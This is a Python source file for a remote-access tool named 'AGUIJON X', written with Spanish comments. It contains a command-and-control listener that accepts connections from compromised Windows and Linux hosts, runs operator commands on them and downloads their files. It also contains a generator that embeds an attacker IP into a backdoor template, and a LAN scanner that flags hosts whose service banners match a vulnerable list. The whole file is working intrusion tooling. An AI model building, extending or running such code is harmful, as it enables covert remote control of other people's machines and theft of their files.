#!usr/bind/python
#-*- coding: utf-8 -*-

import socket, sys, os, re

class Control:

	def __init__(self,local_host):
		self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.key = 'key'
		self.host = local_host
		self.port = 7555
		self.error_count=0
		self.error_test = '' # Only for test 
		print('\n<°>Connected from: '+local_host+'.. >\n')

	def connection(self):
		while 1:
			try:
				self.conn.bind((self.host, self.port))
				print('waiting for connection...')
				self.conn.listen(1)
				conex,adrr = self.conn.accept()
				print('[o]Establishing Connection...')
				recept = conex.recv(4096) # recibo confirmacion de conexión # opcional
				print(recept.decode('utf-8')+"with {0}".format(adrr)) # imprimir confirmacion de conexion con direccion, (opcional).
				self.authenticate(conex) # enviar conex como argumento
			except:
				self.error_count+=1 # contador de errores para evitar que se quede atrapado sin impedir que intente multiples veces.  
				if self.error_count == 1: # enviando mensaje de espera al primer error
					print("\nTrying, Please wait...") 
				if self.error_count == 91: # al tener muchos intentos errados se rompe el ciclo.  
					print("\nError in connection method ")
					break
				pass


	def authenticate(self, conex): # recibir parametro conex en el argumento tambien nombrado 'conex'
		local_key = self.key
		key_recv = conex.recv(8)
		if local_key == key_recv.decode('utf-8'):
			print("<+>Ready..")
			while 1:
				sistema_o = input("\n[Menu] Connection with: 1)Windows - 2)Linux : ")
				if sistema_o == "1":
					self.console1(conex) # eviando el parametro conex
				elif sistema_o == "2": # pendiente
					self.console2(conex) # eviando el parametro conex
				else:
					print("Choose only the menu options please.")


	def console1(self, conex): # recibir parametro conex en el argumento del mismo nombre
		"""Connection with windows"""
		while 1: # reiniciar el proceso para usar un nuevo comando
			try:
				while 1: # Repetir si terminal es vacio o es un espacio
					terminal = input('---°')
					if terminal != "" and not terminal.startswith(" "):	
						conex.send(terminal.encode()) # enviar convertido a bytes
						break

				if terminal.startswith('download '): # si terminal inicia con 'download ' iniciar proceso de descarga
						directory_file = input ('Write directory and name of file: ')
						with open(directory_file, 'wb') as create_file:
							conex.send('ok'.encode()) # confirmar que el archivo ya se creo y esta listo para escribir 
							size_bytes= conex.recv(1024).decode() # recibir tamaño de archivo
							print('Size of the file you expect to receive:', size_bytes)
							count_bytes=0 # inicializar var como int
							while 1:	
								if count_bytes == int(size_bytes): # esperar mensaje de confirmacion de envio total 'end' para terminar el ciclo.
									print('\n[o]Download succesfull')
									conex.send(b'end') # enviar autorizacion para finalizar el proceso de descarga.
									break
								recept_bytes = conex.recv(4096) # recibir bytes del archivo
								create_file.write(recept_bytes)
								count_bytes= count_bytes+len(recept_bytes) # contar y almacenar la cantidad de bytes recibidos para compararlos con los bytes esperados.
								sys.stdout.write('\rDownloaded bytes '+str(count_bytes)) # imprimir datos descargados y sobrescribirlos
				while True:
					back_output = conex.recv(4096).decode('cp850') # 'cp850' decodifica mejor los bytes que proceden del cmd de Windows.
					if not back_output == '*|*': # de llegar el simbolo de este string, se rompe el ciclo
						print(back_output) # imprimir salida del bufer
					else:
						break 
			except KeyboardInterrupt:
				sys.exit(1)
				self.server.close()


	def console2(self, conex): # recibir parametro conex en el argumento del mismo nombre
		"""Connection with Linux"""
		while 1: # reiniciar el proceso para usar un nuevo comando
			try:
				while 1: # Repetir si terminal es vacio o es un espacio
					terminal = input('---°')
					if terminal != "" and not terminal.startswith(" "):	
						conex.send(terminal.encode()) # enviar convertido a bytes
						break
				if terminal.startswith('download '): # si terminal inicia con 'download ' iniciar proceso de descarga
						directory_file = input ('Write directory and name of file: ')
						with open(directory_file, 'wb') as create_file:
							conex.send('ok'.encode()) # confirmar que el archivo ya se creo y esta listo para escribir 
							size_bytes= conex.recv(1024).decode() # recibir tamaño de archivo
							print('Size of the file you expect to receive:', size_bytes)
							count_bytes=0 # inicializar var como int
							while 1:	
								if count_bytes == int(size_bytes): # esperar mensaje de confirmacion de envio total 'end' para terminar el ciclo.
									print('\n[o]Download succesfull')
									conex.send(b'end') # enviar autorizacion para finalizar el proceso de descarga.
									break
								recept_bytes = conex.recv(4096) # recibir bytes del archivo
								create_file.write(recept_bytes)
								count_bytes= count_bytes+len(recept_bytes) # contar y almacenar la cantidad de bytes recibidos para compararlos con los bytes esperados.
								sys.stdout.write('\rDownloaded bytes '+str(count_bytes)) # imprimir datos descargados y sobrescribirlos
				while True:
					back_output = conex.recv(4096).decode('utf-8', 'surrogateescape') # 'utf-8', 'surrogateescape' decodifica mejor los bytes que proceden de la terminal Linux.
					if not back_output == '*|*': # de llegar el simbolo de este string, se rompe el ciclo
						print(back_output) # imprimir salida del bufer
					else:
						break 
			except KeyboardInterrupt:
				sys.exit(1)
				self.server.close()


class Door():

	"""Generate back door"""
	def g_door(self, set_host, set_dir):
		Local_host = set_host
		with open('backx.py', 'rb') as f: # Abrir archivo en formato lectura bytes
			read_f = f.read()   
			print(re.search(r'###localhost###', read_f.decode('utf-8'))) # >Temporal
			substitution = re.sub(r'###localhost###', Local_host, read_f.decode('utf-8')) # Sustituir fragmento de texto especificado por la variable 'Local_host' en el archivo leido pero decodificado.
			print(substitution) # >Temporal
			w_dir = set_dir #input('Write the directory and the name of the door to create:\n<write>> ') # Escribir ruta y nombre del archivo a crear
			dir_f = w_dir +'.py' # concatenar la ruta y el nombre con la extencion '.py'
			create_f = open(dir_f, 'wb') # crear archivo usando la variable concatenada y en formato escritura bytes
			create_f.write(substitution.encode())
			create_f.close() # Cerrar archivo para que se pueda usar sin finalizar este script

  
class BannerScann():

	"""Set target port\s and vuln banner\s"""
	def __init__(self, set_ports, set_vul): # set_ports, set_vulnb
		self.ports = set_ports #open('ports.txt', 'r')
		self.vulnbann= set_vul #open('vulbanners.txt', 'r')
	
	def convert(self): # Para trabajarlos correctamente hay que convertir los puertos y vuln banners a lista.
		"""Convert Ports"""
		list_ports = []
		list_vul = []
		if type(self.ports) is list: # si es una lista es correcto
			list_ports = self.ports
		elif type(self.ports) is int: # si es un entero, se convierte en lista para que sea iterable			
			list_ports.append(self.ports) 	
		else: # Si es algo iterable pero no es una lista, se itera para convertirlo en una lista.
			for i in self.ports: 
				list_ports.append(i.strip())
		"""Convert vulnbanners"""
		if type(self.vulnbann) is list: # si es una lista es correcto
				list_vul = self.vulnbann
		else: # Si es algo iterable pero no es una lista, se itera para convertirlo en una lista (archivo txt).
			for j in self.vulnbann: 
				list_vul.append(j.strip()) # eliminar caracteres de escape con append
		return list_ports,list_vul
	
	def traking(self, rang1, rang2):
		"""Set initial and final host range"""
		use_ports, use_vul = self.convert()
		print('Retorno use_ports:', use_ports)
		print ('Retorno use_ports:', use_vul)
		#range1 = rang1 
		#range2 = rang2 
		for private_host in range(int(rang1), int(rang2)):
			print(private_host)
			for target_port in use_ports:
				print('puesrto iterado:',target_port)
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creando objeto sock
				try:
					sock.connect(('192.168.1.'+str(private_host), int(target_port) )) # Conectandose estableciendo host(servidor) y puerto(servicio). 
					sock.settimeout(1)
					get_banner = sock.recv(512).decode('utf-8') # respuesta del servidor
					for b_vulnn in use_vul:
						if get_banner.strip() == b_vulnn.strip(): # strip para operar los string obtenidos sin caracteres de escape.
							 print('\nA vulnerability was found in:\n\n', 
							 	   'HOST ->', private_host,
							 	   '\n PORT ->',target_port,
							       '\n Vulnerable service ->',get_banner)
					sock.close() # Para que no interfiera con la conexion en el siguiente puerto anlizado.
				except Exception as e:
					print('STDERR=>', e)
				


if __name__ == "__main__":
	#play = Control('192.168.1.4')
	#play.connection()
	
	x = open('ports.txt', 'r')
	y = open('vulbanners.txt', 'r')
	play_bann = BannerScann(x,y)
	play_bann.traking('9','11')

	#play = Door()    
	#play.g_door('192.168.1.4', r'C:\Users\Public\Desktop\mumu')   
	



















# inicio
"""
	os.system('color e')
	print('\n\n')
	print('  _________________________________________________________________')
	print(' | °°°°°°°°<+>>>>>>>>>>>  AGUIJON X - v 1.0  <<<<<<<<<<<+>°°°°°°°° |')
	print(' |______________________|-------------------|______________________|')

	print('\n\n <<<<<<> MENU <>>>>>>\n',
		       ' <1> Continue\n',
		       ' <2> Generate Door\n')
	menu=input('<choose>> ')
	print('\n')


	if menu == '1':
		pass
	elif menu == '2':
		Local_host = input('<Select Local IP>> ')
		with open('backx.py', 'rb') as f: # Abrir archivo en formato lectura bytes
			read_f = f.read()
			print(re.search(r'###localhost###', read_f.decode('utf-8')))
			substitution = re.sub(r'###localhost###', Local_host, read_f.decode('utf-8'))
			print(substitution)
			w_dir = input('Write the directory and the name of the door to create:\n<write>> ')
			dir_f = w_dir +'.py' #concatenar la ruta y el nombre con la extencion '.py'
			create_f = open(dir_f, 'wb')
			create_f.write(substitution.encode())
			create_f.close()
			
"""			

	